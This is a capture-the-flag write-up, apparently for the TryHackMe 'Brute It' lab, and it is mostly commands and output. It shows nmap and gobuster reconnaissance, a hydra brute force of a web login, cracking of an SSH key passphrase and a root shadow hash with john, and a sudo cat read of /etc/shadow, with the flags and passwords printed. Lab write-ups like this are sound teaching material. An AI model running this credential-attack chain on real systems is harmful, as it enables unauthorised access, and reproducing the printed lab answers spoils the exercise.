# Brute It Writeup

> Machine : Linux

> Learn how to brute, hash cracking and escalate privileges in this box!

## Solution

First connect to the machine.

> Deploy the machine
> 
> No answer needed

Then reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.129.128.249 -p-
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> How many ports are open?
> 
> 2

> What version of SSH is running?
> 
> OpenSSH 7.6p1

> What version of Apache is running?
> 
> 2.4.29

> Which Linux distribution is running?
> 
> Ubuntu

After that we use `gobuster` to find the web hidden directories.

```shell
gobuster dir -u 10.129.128.249 -w /usr/share/wordlists/dirb/common.txt
```

```text
admin                (Status: 301) [Size: 316] [--> http://10.129.128.249/admin/]
```

> What is the hidden directory?
> 
> /admin

Visiting `http://10.129.128.249/admin/`, we found login page.
Viewing the source code we see:

```html
    <!-- Hey john, if you do not remember, the username is admin -->
```

That's means the user to login is `admin`.
So we have to use brute force technique to find the password.

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.128.249 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
```

```text
[80][http-post-form] host: 10.129.128.249   login: admin   password: xavier
```

> What is the user:password of the admin panel?
> 
> admin:xavier

After entering the admin page with the credential, we found `id_rsa` for the user `john`.

```shell
wget "http://10.129.128.249/admin/panel/id_rsa"
```

```shell
chmod 600 id_rsa
```

But there is a `passphrase` in `id_rsa` so we have to crack it too.

```shell
ssh2john id_rsa > id_rsa.hash
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

```text
rockinroll       (id_rsa)     
```

> What is John's RSA Private Key passphrase?
> 
> rockinroll

Now we can enter using `ssh`.

```shell
ssh john@10.129.128.249 -i id_rsa
rockinroll
```

Now we are in!

```shell
cat user.txt 
```

```text
THM{a_password_is_not_a_barrier}
```

> user.txt
> 
> THM{a_password_is_not_a_barrier}

> Web flag
> 
> THM{brut3_f0rce_is_e4sy}

Now let's find a way to be root.

```shell
sudo -l
```

```text
(root) NOPASSWD: /bin/cat
```

That's means that we can run `cat` with root privileges. So we can read what we want on the system.

```shell
sudo /bin/cat /etc/shadow
```

```text
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

The `/etc/shadow` file stores encrypted user password hashes and password aging data. So reading it is a big menace.

Now let's try crack the root password using `john`.

```shell
nano root_pass

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt root_pass
```

```text
football         (root)     
```

> What is the root's password?
> 
> football

Now we can change user from `john` into `root`.

```shell
su root
football
```

```shell
cat /root/root.txt 
```

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

> root.txt
> 
> THM{pr1v1l3g3_3sc4l4t10n}

